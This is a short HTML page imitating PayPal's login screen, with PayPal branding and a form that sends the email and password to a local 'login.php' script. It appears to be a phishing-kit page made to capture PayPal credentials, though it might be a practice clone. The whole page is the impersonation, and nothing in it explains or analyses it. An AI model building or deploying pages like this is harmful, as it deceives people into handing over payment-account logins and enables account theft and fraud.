<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in to your PayPal account</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-box">
        <h2 style="color:#003087; font-family:Arial; font-weight:bold; margin-bottom:30px;">PayPal</h2>

        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a>
            <p>Don't have a PayPal account? <a href="#">Sign Up</a></p>
        </div>
    </div>
</body>
</html>
